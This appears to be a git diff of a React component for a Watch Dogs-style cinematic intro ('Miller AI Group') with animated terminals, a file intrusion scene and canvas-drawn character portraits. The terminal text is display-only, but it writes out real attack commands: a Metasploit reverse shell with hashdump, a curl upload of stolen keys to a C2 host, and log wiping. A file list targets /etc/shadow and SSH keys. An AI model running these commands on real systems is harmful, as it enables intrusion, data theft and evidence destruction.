+      'msf6 > set PAYLOAD linux/x64/meterpreter/reverse_tcp',
+      'msf6 > set LHOST 10.0.0.1',
+      'msf6 > exploit',
+      '[*] Started reverse TCP handler on 10.0.0.1:4444',
+      '[*] Meterpreter session 1 opened',
+      'meterpreter > getsystem',
+      '[+] Got SYSTEM privileges',
+      'meterpreter > hashdump',
+      '[+] Dumping password hashes...',
+    ],
+    exfil: [
+      '$ find / -name "*.key" 2>/dev/null',
+      '/etc/ssl/private/server.key',
+      '/home/admin/.ssh/id_rsa',
+      '$ tar -czf loot.tar.gz /etc/ssl /home',
+      '$ curl -X POST -F "file=@loot.tar.gz" https://c2.miller-ai.group/upload',
+      '{"status":"success","size":"2.4GB"}',
+      '$ rm -rf /var/log/*',
+      '$ history -c',
+      '[+] Tracks covered',
+    ],
+  }), [])
+
+  useEffect(() => {
+    // Spawn terminals over time
+    const spawnTimers: NodeJS.Timeout[] = []
+
+    spawnTimers.push(setTimeout(() => {
+      setTerminals(prev => [...prev, {
+        id: 1,
+        lines: [],
+        x: 50,
+        y: 50,
+        title: 'root@target:~#'
+      }])
+    }, 0))
+
+    spawnTimers.push(setTimeout(() => {
+      setTerminals(prev => [...prev, {
+        id: 2,
+        lines: [],
+        x: 500,
+        y: 100,
+        title: 'msf6>'
+      }])
+    }, 2000))
+
+    spawnTimers.push(setTimeout(() => {
+      setTerminals(prev => [...prev, {
+        id: 3,
+        lines: [],
+        x: 200,
+        y: 350,
+        title: 'exfil@c2:~#'
+      }])
+    }, 4000))
+
+    // Type into terminals
+    let mainLine = 0
+    let exploitLine = 0
+    let exfilLine = 0
+
+    const typeInterval = setInterval(() => {
+      setTerminals(prev => prev.map(t => {
+        if (t.id === 1 && mainLine < terminalCommands.main.length) {
+          mainLine++
+          return { ...t, lines: terminalCommands.main.slice(0, mainLine) }
+        }
+        if (t.id === 2 && exploitLine < terminalCommands.exploit.length) {
+          exploitLine++
+          return { ...t, lines: terminalCommands.exploit.slice(0, exploitLine) }
+        }
+        if (t.id === 3 && exfilLine < terminalCommands.exfil.length) {
+          exfilLine++
+          return { ...t, lines: terminalCommands.exfil.slice(0, exfilLine) }
+        }
+        return t
+      }))
+    }, 200)
+
+    const completeTimer = setTimeout(onComplete, 10000)
+
+    return () => {
+      spawnTimers.forEach(clearTimeout)
+      clearInterval(typeInterval)
+      clearTimeout(completeTimer)
+    }
+  }, [terminalCommands, onComplete])
+
+  return (
+    <motion.div
+      className="fixed inset-0 z-20 bg-black"
+      initial={{ opacity: 0 }}
+      animate={{ opacity: 1 }}
+      exit={{ opacity: 0 }}
+    >
+      <DedSecBackground intensity={0.5} />
+
+      {/* Terminal windows */}
+      <AnimatePresence>
+        {terminals.map(terminal => (
+          <motion.div
+            key={terminal.id}
+            className="absolute rounded-lg overflow-hidden shadow-2xl"
+            style={{
+              left: terminal.x,
+              top: terminal.y,
+              width: 450,
+              background: 'rgba(0,0,0,0.95)',
+              border: '1px solid rgba(0,255,65,0.5)',
+              boxShadow: '0 0 30px rgba(0,255,65,0.3)',
+            }}
+            initial={{ opacity: 0, scale: 0.8, y: 20 }}
+            animate={{ opacity: 1, scale: 1, y: 0 }}
+          >
+            {/* Title bar */}
+            <div className="px-3 py-2 flex items-center gap-2 bg-neutral-900 border-b border-green-500/30">
+              <div className="flex gap-1.5">
+                <div className="w-3 h-3 rounded-full bg-red-500" />
+                <div className="w-3 h-3 rounded-full bg-yellow-500" />
+                <div className="w-3 h-3 rounded-full bg-green-500" />
+              </div>
+              <span className="text-xs font-mono text-green-400 ml-2">{terminal.title}</span>
+            </div>
+
+            {/* Content */}
+            <div className="p-3 font-mono text-xs h-48 overflow-y-auto bg-black/80">
+              {terminal.lines.map((line, i) => (
+                <div
+                  key={i}
+                  className={`leading-relaxed ${
+                    line.startsWith('$') || line.startsWith('msf') || line.startsWith('meterpreter')
+                      ? 'text-green-400'
+                      : line.startsWith('[+]')
+                        ? 'text-green-500'
+                        : line.startsWith('[*]')
+                          ? 'text-cyan-400'
+                          : line.startsWith('[!]')
+                            ? 'text-red-500'
+                            : 'text-neutral-300'
+                  }`}
+                >
+                  {line}
+                </div>
+              ))}
+              <motion.span
+                className="text-green-400"
+                animate={{ opacity: [1, 0] }}
+                transition={{ duration: 0.5, repeat: Infinity }}
+              >
+                █
+              </motion.span>
+            </div>
+          </motion.div>
+        ))}
+      </AnimatePresence>
+
+      {/* Status */}
+      <div className="absolute top-4 right-4 font-mono text-sm text-right">
+        <div className="text-fuchsia-500">MILLER AI GROUP</div>
+        <div className="text-cyan-400 text-xs">OPERATION: SYSTEM TAKEOVER</div>
+        <motion.div
+          className="text-red-500 text-xs mt-2"
+          animate={{ opacity: [1, 0.3, 1] }}
+          transition={{ duration: 0.5, repeat: Infinity }}
+        >
+          ● RECORDING
+        </motion.div>
+      </div>
+    </motion.div>
+  )
+}
+
+// ============================================
+// SCENE 5: FILE INTRUSION
+// ============================================
+function FileIntrusionScene({ onComplete }: { onComplete: () => void }) {
+  const [files, setFiles] = useState<Array<{
+    path: string
+    status: 'scanning' | 'accessed' | 'exfiltrated'
+    type: 'file' | 'folder'
+  }>>([])
+
+  const fileSystem = useMemo(() => [
+    { path: '/etc/passwd', type: 'file' as const },
+    { path: '/etc/shadow', type: 'file' as const },
+    { path: '/home/admin/.ssh/', type: 'folder' as const },
+    { path: '/home/admin/.ssh/id_rsa', type: 'file' as const },
+    { path: '/var/lib/mysql/', type: 'folder' as const },
+    { path: '/var/lib/mysql/users.db', type: 'file' as const },
+    { path: '/opt/app/config/', type: 'folder' as const },
+    { path: '/opt/app/config/secrets.env', type: 'file' as const },
+    { path: '/root/.bash_history', type: 'file' as const },
+    { path: '/var/log/auth.log', type: 'file' as const },
+    { path: '/etc/ssl/private/', type: 'folder' as const },
+    { path: '/etc/ssl/private/server.key', type: 'file' as const },
+  ], [])
+
+  useEffect(() => {
+    let idx = 0
+
+    const scanInterval = setInterval(() => {
+      if (idx < fileSystem.length) {
+        const file = fileSystem[idx]
+        setFiles(prev => [...prev, { ...file, status: 'scanning' }])
+
+        // Update to accessed after delay
+        setTimeout(() => {
+          setFiles(prev => prev.map((f, i) =>
+            i === idx ? { ...f, status: 'accessed' } : f
+          ))
+        }, 300)
+
+        // Update to exfiltrated
+        setTimeout(() => {
+          setFiles(prev => prev.map((f, i) =>
+            i === idx ? { ...f, status: 'exfiltrated' } : f
+          ))
+        }, 600)
+
+        idx++
+      } else {
+        clearInterval(scanInterval)
+        setTimeout(onComplete, 2000)
+      }
+    }, 400)
+
+    return () => clearInterval(scanInterval)
+  }, [fileSystem, onComplete])
+
+  const exfiltratedCount = files.filter(f => f.status === 'exfiltrated').length
+
+  return (
+    <motion.div
+      className="fixed inset-0 z-20 bg-black"
+      initial={{ opacity: 0 }}
+      animate={{ opacity: 1 }}
+      exit={{ opacity: 0 }}
+    >
+      <DedSecBackground intensity={0.3} />
+
+      <div className="absolute inset-0 flex items-center justify-center">
+        <div className="w-full max-w-3xl mx-8">
+          {/* Header */}
+          <div className="mb-6">
+            <h2 className="text-3xl font-mono font-bold text-fuchsia-500 mb-2">
+              FILE SYSTEM INTRUSION
+            </h2>
+            <p className="text-cyan-400 font-mono text-sm">
+              Scanning and exfiltrating sensitive files...
+            </p>
+          </div>
+
+          {/* File list */}
+          <div className="bg-black/80 border border-fuchsia-500/30 rounded-lg p-4 font-mono text-sm max-h-96 overflow-y-auto">
+            {files.map((file, i) => (
+              <motion.div
+                key={i}
+                className="flex items-center gap-3 py-1"
+                initial={{ opacity: 0, x: -20 }}
+                animate={{ opacity: 1, x: 0 }}
+              >
+                <span className={`w-24 text-xs ${
+                  file.status === 'scanning' ? 'text-yellow-400' :
+                  file.status === 'accessed' ? 'text-cyan-400' :
+                  'text-green-500'
+                }`}>
+                  [{file.status.toUpperCase()}]
+                </span>
+                <span className={file.type === 'folder' ? 'text-blue-400' : 'text-neutral-300'}>
+                  {file.type === 'folder' ? '📁' : '📄'} {file.path}
+                </span>
+                {file.status === 'exfiltrated' && (
+                  <span className="text-green-500 ml-auto">✓ CAPTURED</span>
+                )}
+              </motion.div>
+            ))}
+          </div>
+
+          {/* Stats */}
+          <div className="mt-4 flex justify-between text-sm font-mono">
+            <span className="text-fuchsia-400">
+              FILES EXFILTRATED: {exfiltratedCount}/{fileSystem.length}
+            </span>
+            <span className="text-cyan-400">
+              DATA SIZE: {(exfiltratedCount * 0.3).toFixed(1)} GB
+            </span>
+          </div>
+        </div>
+      </div>
+    </motion.div>
+  )
+}
+
+// ============================================
+// SCENE 6: CHARACTER BRIEFING - GTA/COD STYLE
+// ============================================
+function CharacterBriefingScene({ onComplete }: { onComplete: () => void }) {
+  const [currentIndex, setCurrentIndex] = useState(0)
+  const [showDetails, setShowDetails] = useState(false)
+  const character = CHARACTERS[currentIndex]
+
+  useEffect(() => {
+    setShowDetails(false)
+    const detailsTimer = setTimeout(() => setShowDetails(true), 500)
+
+    const nextTimer = setTimeout(() => {
+      if (currentIndex < CHARACTERS.length - 1) {
+        setCurrentIndex(prev => prev + 1)
+      } else {
+        onComplete()
+      }
+    }, 4000)
+
+    return () => {
+      clearTimeout(detailsTimer)
+      clearTimeout(nextTimer)
+    }
+  }, [currentIndex, onComplete])
+
+  return (
+    <motion.div
+      className="fixed inset-0 z-20 bg-black overflow-hidden"
+      initial={{ opacity: 0 }}
+      animate={{ opacity: 1 }}
+      exit={{ opacity: 0 }}
+    >
+      {/* Animated background */}
+      <DedSecBackground intensity={0.8} />
+
+      {/* Diagonal stripes */}
+      <div
+        className="absolute inset-0 opacity-10"
+        style={{
+          backgroundImage: `repeating-linear-gradient(
+            45deg,
+            ${character.color} 0px,
+            ${character.color} 2px,
+            transparent 2px,
+            transparent 20px
+          )`,
+        }}
+      />
+
+      {/* Character color wash */}
+      <motion.div
+        className="absolute inset-0"
+        style={{
+          background: `radial-gradient(ellipse at 30% 50%, ${character.color}30 0%, transparent 70%)`,
+        }}
+        initial={{ opacity: 0 }}
+        animate={{ opacity: 1 }}
+        key={character.id}
+      />
+
+      {/* Main content */}
+      <div className="relative z-10 h-full flex">
+        {/* Left side - Character visual */}
+        <div className="w-1/2 h-full flex items-center justify-center relative">
+          <CharacterPortrait character={character} />
+        </div>
+
+        {/* Right side - Info panel */}
+        <div className="w-1/2 h-full flex items-center px-12">
+          <AnimatePresence mode="wait">
+            {showDetails && (
+              <motion.div
+                key={character.id}
+                initial={{ opacity: 0, x: 50 }}
+                animate={{ opacity: 1, x: 0 }}
+                exit={{ opacity: 0, x: -50 }}
+                className="space-y-6"
+              >
+                {/* Codename */}
+                <div>
+                  <motion.p
+                    className="text-sm font-mono tracking-[0.3em] mb-2"
+                    style={{ color: character.color }}
+                    initial={{ opacity: 0 }}
+                    animate={{ opacity: 1 }}
+                    transition={{ delay: 0.1 }}
+                  >
+                    OPERATIVE CODENAME
+                  </motion.p>
+                  <motion.h1
+                    className="text-6xl font-bold font-mono"
+                    style={{
+                      color: '#ffffff',
+                      textShadow: `0 0 30px ${character.color}`,
+                    }}
+                    initial={{ opacity: 0, y: 20 }}
+                    animate={{ opacity: 1, y: 0 }}
+                    transition={{ delay: 0.2 }}
+                  >
+                    {character.codename}
+                  </motion.h1>
+                  <motion.p
+                    className="text-2xl font-mono mt-2 text-neutral-400"
+                    initial={{ opacity: 0 }}
+                    animate={{ opacity: 1 }}
+                    transition={{ delay: 0.3 }}
+                  >
+                    {character.name}
+                  </motion.p>
+                </div>
+
+                {/* Quote */}
+                <motion.blockquote
+                  className="text-xl font-mono italic border-l-4 pl-4 py-2"
+                  style={{ borderColor: character.color, color: 'rgba(255,255,255,0.8)' }}
+                  initial={{ opacity: 0, x: -20 }}
+                  animate={{ opacity: 1, x: 0 }}
+                  transition={{ delay: 0.4 }}
+                >
+                  "{character.quote}"
+                </motion.blockquote>
+
+                {/* Stats */}
+                <motion.div
+                  className="grid grid-cols-2 gap-4"
+                  initial={{ opacity: 0 }}
+                  animate={{ opacity: 1 }}
+                  transition={{ delay: 0.5 }}
+                >
+                  <div className="border border-neutral-700 rounded p-3 bg-black/50">
+                    <p className="text-xs text-neutral-500 font-mono">SPECIALTY</p>
+                    <p className="text-sm font-mono" style={{ color: character.color }}>
+                      {character.specialty}
+                    </p>
+                  </div>
+                  <div className="border border-neutral-700 rounded p-3 bg-black/50">
+                    <p className="text-xs text-neutral-500 font-mono">THREAT LEVEL</p>
+                    <p className="text-sm font-mono text-red-500">
+                      {character.threat}
+                    </p>
+                  </div>
+                </motion.div>
+
+                {/* Progress indicator */}
+                <motion.div
+                  className="flex gap-2 mt-8"
+                  initial={{ opacity: 0 }}
+                  animate={{ opacity: 1 }}
+                  transition={{ delay: 0.6 }}
+                >
+                  {CHARACTERS.map((_, i) => (
+                    <div
+                      key={i}
+                      className={`w-12 h-1 rounded ${i === currentIndex ? 'bg-white' : 'bg-neutral-700'}`}
+                    />
+                  ))}
+                </motion.div>
+              </motion.div>
+            )}
+          </AnimatePresence>
+        </div>
+      </div>
+
+      {/* Corner brackets */}
+      <div className="absolute top-8 left-8 w-16 h-16 border-t-2 border-l-2" style={{ borderColor: character.color }} />
+      <div className="absolute top-8 right-8 w-16 h-16 border-t-2 border-r-2" style={{ borderColor: character.color }} />
+      <div className="absolute bottom-8 left-8 w-16 h-16 border-b-2 border-l-2" style={{ borderColor: character.color }} />
+      <div className="absolute bottom-8 right-8 w-16 h-16 border-b-2 border-r-2" style={{ borderColor: character.color }} />
+
+      {/* Bottom bar */}
+      <div className="absolute bottom-0 left-0 right-0 h-16 bg-gradient-to-t from-black to-transparent" />
+      <div className="absolute bottom-4 left-8 right-8 flex justify-between font-mono text-xs">
+        <span style={{ color: character.color }}>MILLER AI GROUP // OPERATIVE DOSSIER</span>
+        <span className="text-neutral-500">CLEARANCE: OMEGA BLACK</span>
+      </div>
+    </motion.div>
+  )
+}
+
+// ============================================
+// CHARACTER PORTRAIT - Recognizable Features
+// ============================================
+function CharacterPortrait({ character }: { character: typeof CHARACTERS[0] }) {
+  const canvasRef = useRef<HTMLCanvasElement>(null)
+  const animationRef = useRef<number | undefined>(undefined)
+  const frameRef = useRef(0)
+
+  useEffect(() => {
+    const canvas = canvasRef.current
+    if (!canvas) return
+    const ctx = canvas.getContext('2d')
+    if (!ctx) return
+
+    const size = 400
     canvas.width = size
     canvas.height = size
 
-    // Parse hex color to RGB
     const hexToRgb = (hex: string) => {
       const result = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hex)
       return result ? {
@@ -404,151 +1152,392 @@ function AnimatedCharacterSilhouette({
     const centerX = size / 2
     const centerY = size / 2
 
-    // Animated silhouette particles
-    const particles: Array<{
-      x: number
-      y: number
-      vx: number
-      vy: number
-      size: number
-      alpha: number
-      life: number
-    }> = []
+    const drawJohnWick = (ctx: CanvasRenderingContext2D, time: number) => {
+      const breathe = Math.sin(time * 2) * 2
 
-    // Head and body outline points for character shape
-    const createBodyPoints = (time: number) => {
-      const breathing = Math.sin(time * 2) * 3
-      const sway = Math.sin(time * 0.5) * 5
+      // Long dark hair
+      ctx.fillStyle = '#1a1a1a'
+      ctx.beginPath()
+      ctx.ellipse(centerX, centerY - 40 + breathe, 70, 85, 0, 0, Math.PI * 2)
+      ctx.fill()
 
-      return {
-        // Head
-        head: { x: centerX + sway, y: centerY - 60 + breathing, radius: 45 },
-        // Shoulders
-        leftShoulder: { x: centerX - 55 + sway * 0.5, y: centerY + 10 + breathing * 0.5 },
-        rightShoulder: { x: centerX + 55 + sway * 0.5, y: centerY + 10 + breathing * 0.5 },
-        // Torso
-        torsoWidth: 80 + breathing * 0.3,
+      // Face
+      ctx.fillStyle = '#d4a574'
+      ctx.beginPath()
+      ctx.ellipse(centerX, centerY - 50 + breathe, 50, 60, 0, 0, Math.PI * 2)
+      ctx.fill()
+
+      // Beard/stubble
+      ctx.fillStyle = '#2a2a2a'
+      ctx.beginPath()
+      ctx.ellipse(centerX, centerY - 20 + breathe, 45, 35, 0, 0.3, Math.PI - 0.3)
+      ctx.fill()
+
+      // Suit collar
+      ctx.fillStyle = '#0a0a0a'
+      ctx.beginPath()
+      ctx.moveTo(centerX - 80, centerY + 60 + breathe)
+      ctx.lineTo(centerX - 30, centerY + 20 + breathe)
+      ctx.lineTo(centerX, centerY + 40 + breathe)
+      ctx.lineTo(centerX + 30, centerY + 20 + breathe)
+      ctx.lineTo(centerX + 80, centerY + 60 + breathe)
+      ctx.lineTo(centerX + 100, size)
+      ctx.lineTo(centerX - 100, size)
+      ctx.closePath()
+      ctx.fill()
+
+      // White shirt
+      ctx.fillStyle = '#ffffff'
+      ctx.beginPath()
+      ctx.moveTo(centerX - 15, centerY + 30 + breathe)
+      ctx.lineTo(centerX, centerY + 60 + breathe)
+      ctx.lineTo(centerX + 15, centerY + 30 + breathe)
+      ctx.closePath()
+      ctx.fill()
+
+      // Eyes - intense
+      ctx.fillStyle = '#000000'
+      ctx.beginPath()
+      ctx.ellipse(centerX - 18, centerY - 60 + breathe, 8, 5, 0, 0, Math.PI * 2)
+      ctx.ellipse(centerX + 18, centerY - 60 + breathe, 8, 5, 0, 0, Math.PI * 2)
+      ctx.fill()
+
+      // Eyebrows - furrowed
+      ctx.strokeStyle = '#1a1a1a'
+      ctx.lineWidth = 4
+      ctx.beginPath()
+      ctx.moveTo(centerX - 30, centerY - 75 + breathe)
+      ctx.lineTo(centerX - 10, centerY - 70 + breathe)
+      ctx.moveTo(centerX + 30, centerY - 75 + breathe)
+      ctx.lineTo(centerX + 10, centerY - 70 + breathe)
+      ctx.stroke()
+    }
+
+    const drawBart = (ctx: CanvasRenderingContext2D, time: number) => {
+      const bounce = Math.sin(time * 4) * 3
+
+      // Spiky hair - THE signature Bart look
+      ctx.fillStyle = '#ffd700'
+      for (let i = 0; i < 9; i++) {
+        const angle = (i / 9) * Math.PI - Math.PI / 2
+        const spikeLength = 30 + (i % 2) * 10
+        ctx.beginPath()
+        ctx.moveTo(centerX + Math.cos(angle - 0.2) * 45, centerY - 70 + Math.sin(angle - 0.2) * 45 + bounce)
+        ctx.lineTo(centerX + Math.cos(angle) * (45 + spikeLength), centerY - 70 + Math.sin(angle) * (45 + spikeLength) + bounce)
+        ctx.lineTo(centerX + Math.cos(angle + 0.2) * 45, centerY - 70 + Math.sin(angle + 0.2) * 45 + bounce)
+        ctx.closePath()
+        ctx.fill()
       }
+
+      // Head
+      ctx.fillStyle = '#ffd700'
+      ctx.beginPath()
+      ctx.ellipse(centerX, centerY - 40 + bounce, 50, 55, 0, 0, Math.PI * 2)
+      ctx.fill()
+
+      // Eyes - big round Simpsons style
+      ctx.fillStyle = '#ffffff'
+      ctx.beginPath()
+      ctx.ellipse(centerX - 15, centerY - 50 + bounce, 18, 22, 0, 0, Math.PI * 2)
+      ctx.ellipse(centerX + 15, centerY - 50 + bounce, 18, 22, 0, 0, Math.PI * 2)
+      ctx.fill()
+
+      // Pupils
+      ctx.fillStyle = '#000000'
+      ctx.beginPath()
+      ctx.arc(centerX - 10, centerY - 48 + bounce, 6, 0, Math.PI * 2)
+      ctx.arc(centerX + 20, centerY - 48 + bounce, 6, 0, Math.PI * 2)
+      ctx.fill()
+
+      // Mischievous smirk
+      ctx.strokeStyle = '#000000'
+      ctx.lineWidth = 3
+      ctx.beginPath()
+      ctx.arc(centerX, centerY - 25 + bounce, 20, 0.2, Math.PI - 0.2)
+      ctx.stroke()
+
+      // Red shirt
+      ctx.fillStyle = '#ff4444'
+      ctx.beginPath()
+      ctx.moveTo(centerX - 60, centerY + 30 + bounce)
+      ctx.lineTo(centerX + 60, centerY + 30 + bounce)
+      ctx.lineTo(centerX + 80, size)
+      ctx.lineTo(centerX - 80, size)
+      ctx.closePath()
+      ctx.fill()
+
+      // Orange trim
+      ctx.fillStyle = '#ff8c00'
+      ctx.fillRect(centerX - 60, centerY + 30 + bounce, 120, 15)
+    }
+
+    const drawJoker = (ctx: CanvasRenderingContext2D, time: number) => {
+      const twitch = Math.random() > 0.95 ? (Math.random() - 0.5) * 10 : 0
+      const breathe = Math.sin(time * 2) * 2
+
+      // Green slicked back hair
+      ctx.fillStyle = '#228b22'
+      ctx.beginPath()
+      ctx.ellipse(centerX + twitch, centerY - 50 + breathe, 55, 70, 0, Math.PI, Math.PI * 2)
+      ctx.fill()
+
+      // Hair strands
+      for (let i = 0; i < 5; i++) {
+        ctx.beginPath()
+        ctx.moveTo(centerX - 40 + i * 20 + twitch, centerY - 100 + breathe)
+        ctx.quadraticCurveTo(
+          centerX - 30 + i * 20 + twitch,
+          centerY - 130 + breathe,
+          centerX - 20 + i * 20 + twitch,
+          centerY - 110 + breathe
+        )
+        ctx.lineWidth = 8
+        ctx.strokeStyle = '#228b22'
+        ctx.stroke()
+      }
+
+      // White face
+      ctx.fillStyle = '#f5f5f5'
+      ctx.beginPath()
+      ctx.ellipse(centerX + twitch, centerY - 40 + breathe, 50, 60, 0, 0, Math.PI * 2)
+      ctx.fill()
+
+      // Dark eye sockets
+      ctx.fillStyle = '#2a2a4a'
+      ctx.beginPath()
+      ctx.ellipse(centerX - 20 + twitch, centerY - 55 + breathe, 15, 12, -0.2, 0, Math.PI * 2)
+      ctx.ellipse(centerX + 20 + twitch, centerY - 55 + breathe, 15, 12, 0.2, 0, Math.PI * 2)
+      ctx.fill()
+
+      // Eyes
+      ctx.fillStyle = '#000000'
+      ctx.beginPath()
+      ctx.arc(centerX - 20 + twitch, centerY - 55 + breathe, 5, 0, Math.PI * 2)
+      ctx.arc(centerX + 20 + twitch, centerY - 55 + breathe, 5, 0, Math.PI * 2)
+      ctx.fill()
+
+      // THE SMILE - red scars
+      ctx.fillStyle = '#cc0000'
+      ctx.beginPath()
+      ctx.moveTo(centerX - 45 + twitch, centerY - 25 + breathe)
+      ctx.quadraticCurveTo(centerX + twitch, centerY + 10 + breathe, centerX + 45 + twitch, centerY - 25 + breathe)
+      ctx.quadraticCurveTo(centerX + twitch, centerY - 10 + breathe, centerX - 45 + twitch, centerY - 25 + breathe)
+      ctx.fill()
+
+      // Smile scar lines
+      ctx.strokeStyle = '#990000'
+      ctx.lineWidth = 2
+      ctx.beginPath()
+      ctx.moveTo(centerX - 45 + twitch, centerY - 25 + breathe)
+      ctx.lineTo(centerX - 55 + twitch, centerY - 35 + breathe)
+      ctx.moveTo(centerX + 45 + twitch, centerY - 25 + breathe)
+      ctx.lineTo(centerX + 55 + twitch, centerY - 35 + breathe)
+      ctx.stroke()
+
+      // Purple suit
+      ctx.fillStyle = '#4b0082'
+      ctx.beginPath()
+      ctx.moveTo(centerX - 70 + twitch, centerY + 40 + breathe)
+      ctx.lineTo(centerX - 25 + twitch, centerY + 10 + breathe)
+      ctx.lineTo(centerX + twitch, centerY + 30 + breathe)
+      ctx.lineTo(centerX + 25 + twitch, centerY + 10 + breathe)
+      ctx.lineTo(centerX + 70 + twitch, centerY + 40 + breathe)
+      ctx.lineTo(centerX + 90 + twitch, size)
+      ctx.lineTo(centerX - 90 + twitch, size)
+      ctx.closePath()
+      ctx.fill()
+
+      // Green vest
+      ctx.fillStyle = '#228b22'
+      ctx.beginPath()
+      ctx.moveTo(centerX - 20 + twitch, centerY + 20 + breathe)
+      ctx.lineTo(centerX + twitch, centerY + 50 + breathe)
+      ctx.lineTo(centerX + 20 + twitch, centerY + 20 + breathe)
+      ctx.closePath()
+      ctx.fill()
+    }
+
+    const drawWolf = (ctx: CanvasRenderingContext2D, time: number) => {
+      const breathe = Math.sin(time * 2) * 2
+
+      // Slicked back dark hair
+      ctx.fillStyle = '#2a2a2a'
+      ctx.beginPath()
+      ctx.ellipse(centerX, centerY - 55 + breathe, 50, 45, 0, Math.PI, Math.PI * 2)
+      ctx.fill()
+
+      // Face
+      ctx.fillStyle = '#d4a574'
+      ctx.beginPath()
+      ctx.ellipse(centerX, centerY - 45 + breathe, 48, 58, 0, 0, Math.PI * 2)
+      ctx.fill()
+
+      // Confident smirk
+      ctx.strokeStyle = '#8b4513'
+      ctx.lineWidth = 3
+      ctx.beginPath()
+      ctx.arc(centerX + 5, centerY - 20 + breathe, 15, 0.1, Math.PI - 0.3)
+      ctx.stroke()
+
+      // Eyes - intense, confident
+      ctx.fillStyle = '#000000'
+      ctx.beginPath()
+      ctx.ellipse(centerX - 18, centerY - 55 + breathe, 7, 5, 0, 0, Math.PI * 2)
+      ctx.ellipse(centerX + 18, centerY - 55 + breathe, 7, 5, 0, 0, Math.PI * 2)
+      ctx.fill()
+
+      // Raised eyebrow
+      ctx.strokeStyle = '#2a2a2a'
+      ctx.lineWidth = 3
+      ctx.beginPath()
+      ctx.arc(centerX + 18, centerY - 68 + breathe, 12, Math.PI + 0.3, Math.PI * 2 - 0.3)
+      ctx.stroke()
+
+      // Expensive suit
+      ctx.fillStyle = '#1a1a3a'
+      ctx.beginPath()
+      ctx.moveTo(centerX - 75, centerY + 50 + breathe)
+      ctx.lineTo(centerX - 30, centerY + 15 + breathe)
+      ctx.lineTo(centerX, centerY + 35 + breathe)
+      ctx.lineTo(centerX + 30, centerY + 15 + breathe)
+      ctx.lineTo(centerX + 75, centerY + 50 + breathe)
+      ctx.lineTo(centerX + 95, size)
+      ctx.lineTo(centerX - 95, size)
+      ctx.closePath()
+      ctx.fill()
+
+      // White shirt
+      ctx.fillStyle = '#ffffff'
+      ctx.beginPath()
+      ctx.moveTo(centerX - 15, centerY + 25 + breathe)
+      ctx.lineTo(centerX, centerY + 55 + breathe)
+      ctx.lineTo(centerX + 15, centerY + 25 + breathe)
+      ctx.closePath()
+      ctx.fill()
+
+      // Gold tie
+      ctx.fillStyle = '#ffd700'
+      ctx.beginPath()
+      ctx.moveTo(centerX - 8, centerY + 30 + breathe)
+      ctx.lineTo(centerX, centerY + 80 + breathe)
+      ctx.lineTo(centerX + 8, centerY + 30 + breathe)
+      ctx.closePath()
+      ctx.fill()
+    }
+
+    const drawDuchess = (ctx: CanvasRenderingContext2D, time: number) => {
+      const sway = Math.sin(time * 1.5) * 2
+
+      // Long blonde hair
+      ctx.fillStyle = '#ffd700'
+      ctx.beginPath()
+      ctx.ellipse(centerX + sway, centerY - 30, 65, 90, 0, 0, Math.PI * 2)
+      ctx.fill()
+
+      // Hair waves
+      ctx.fillStyle = '#daa520'
+      for (let i = 0; i < 3; i++) {
+        ctx.beginPath()
+        ctx.ellipse(centerX - 50 + i * 25 + sway, centerY + 20, 8, 40, 0.2, 0, Math.PI * 2)
+        ctx.fill()
+      }
+
+      // Face
+      ctx.fillStyle = '#f5deb3'
+      ctx.beginPath()
+      ctx.ellipse(centerX + sway, centerY - 45, 42, 52, 0, 0, Math.PI * 2)
+      ctx.fill()
+
+      // Eyes - alluring
+      ctx.fillStyle = '#1a5f7a'
+      ctx.beginPath()
+      ctx.ellipse(centerX - 15 + sway, centerY - 52, 8, 6, 0, 0, Math.PI * 2)
+      ctx.ellipse(centerX + 15 + sway, centerY - 52, 8, 6, 0, 0, Math.PI * 2)
+      ctx.fill()
+
+      // Eyelashes
+      ctx.strokeStyle = '#000000'
+      ctx.lineWidth = 2
+      for (let i = 0; i < 3; i++) {
+        ctx.beginPath()
+        ctx.moveTo(centerX - 20 + i * 5 + sway, centerY - 58)
+        ctx.lineTo(centerX - 22 + i * 5 + sway, centerY - 65)
+        ctx.moveTo(centerX + 10 + i * 5 + sway, centerY - 58)
+        ctx.lineTo(centerX + 8 + i * 5 + sway, centerY - 65)
+        ctx.stroke()
+      }
+
+      // Red lips
+      ctx.fillStyle = '#cc0000'
+      ctx.beginPath()
+      ctx.ellipse(centerX + sway, centerY - 25, 12, 6, 0, 0, Math.PI * 2)
+      ctx.fill()
+
+      // Elegant dress
+      ctx.fillStyle = '#ff1493'
+      ctx.beginPath()
+      ctx.moveTo(centerX - 50 + sway, centerY + 20)
+      ctx.quadraticCurveTo(centerX + sway, centerY, centerX + 50 + sway, centerY + 20)
+      ctx.lineTo(centerX + 80 + sway, size)
+      ctx.lineTo(centerX - 80 + sway, size)
+      ctx.closePath()
+      ctx.fill()
+
+      // Necklace
+      ctx.strokeStyle = '#ffd700'
+      ctx.lineWidth = 3
+      ctx.beginPath()
+      ctx.arc(centerX + sway, centerY + 5, 30, 0.3, Math.PI - 0.3)
+      ctx.stroke()
+
+      // Diamond pendant
+      ctx.fillStyle = '#ffffff'
+      ctx.beginPath()
+      ctx.moveTo(centerX + sway, centerY + 30)
+      ctx.lineTo(centerX - 8 + sway, centerY + 40)
+      ctx.lineTo(centerX + sway, centerY + 55)
+      ctx.lineTo(centerX + 8 + sway, centerY + 40)
+      ctx.closePath()
+      ctx.fill()
     }
 
     const animate = () => {
       frameRef.current += 0.016
       const time = frameRef.current
 
-      // Clear with trail effect
-      ctx.fillStyle = 'rgba(0, 0, 0, 0.15)'
-      ctx.fillRect(0, 0, size, size)
+      // Clear
+      ctx.clearRect(0, 0, size, size)
 
-      const body = createBodyPoints(time)
+      // Glow effect
+      ctx.shadowBlur = 30
+      ctx.shadowColor = character.color
 
-      // Draw glitch effect layers
-      for (let layer = 0; layer < 3; layer++) {
-        const glitchOffset = Math.random() > 0.95 ? (Math.random() - 0.5) * 10 : 0
-        const layerAlpha = layer === 1 ? 0.8 : 0.3
-
-        ctx.save()
-        ctx.translate(glitchOffset * (layer - 1), 0)
-
-        // Draw head glow
-        const gradient = ctx.createRadialGradient(
-          body.head.x, body.head.y, 0,
-          body.head.x, body.head.y, body.head.radius * 1.5
-        )
-        gradient.addColorStop(0, `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, ${0.6 * layerAlpha})`)
-        gradient.addColorStop(0.5, `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, ${0.2 * layerAlpha})`)
-        gradient.addColorStop(1, 'transparent')
-
-        ctx.fillStyle = gradient
